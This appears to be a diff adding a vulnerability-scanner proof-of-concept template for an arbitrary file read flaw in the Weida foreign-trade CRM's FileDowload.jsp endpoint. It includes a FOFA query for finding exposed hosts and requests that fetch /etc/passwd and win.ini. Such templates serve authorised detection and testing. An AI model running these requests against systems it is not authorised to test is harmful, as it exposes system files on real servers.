@@ -1,0 +1,32 @@
+id: poc-yaml-weidasoft-filedowload-anyfile-read
+info:
+  name: 维达外贸客户关系管理系统 FileDowload 任意文件读取漏洞
+  severity: high
+  tags:
+  - 文件读取
+  finger: 维达外贸客户关系管理系统
+  fofa: title="维达外贸客户关系管理系统"
+variables:
+  paths: 'C:/windows/win.ini
+
+    etc/passwd
+
+    '
+requests:
+- method: GET
+  path: /file/FileDowload.jsp?url={{.paths}}
+  expression: '(status_code == 200 && contains(content_type,"application/octet-stream")
+    && contains(headers,"filename=")) &&
+
+    (
+
+    (contains(body,"root:") && contains(body,"/bin"))
+
+    ||
+
+    (contains(body,"[files]") && contains(body,"bit app support"))
+
+    )
+
+    '
+transport: http
